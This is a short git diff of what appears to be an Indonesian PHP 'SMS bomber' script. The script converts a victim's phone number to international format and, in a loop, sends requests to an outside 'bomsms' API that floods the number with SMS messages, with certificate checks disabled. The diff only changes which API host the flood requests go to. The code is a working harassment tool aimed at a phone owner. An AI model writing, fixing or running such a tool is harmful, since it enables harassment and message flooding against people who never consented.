@@ -12,7 +12,7 @@ echo "\n+---------------------[# HASIL #]----------------------+\n";
 $no = '62'.substr(trim($no), 1);
 for ($x=1; $x<=$loop; $x++) {
 	$c = curl_init();
-	curl_setopt($c, CURLOPT_URL, "https://idsystem404.000webhostapp.com/api/api-bomsmstiket.php?bomsms=".$no);
+	curl_setopt($c, CURLOPT_URL, "https://api.petaniilmu.com/api/api-bomsmstiket.php?bomsms=".$no);
 	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
 	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
 	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
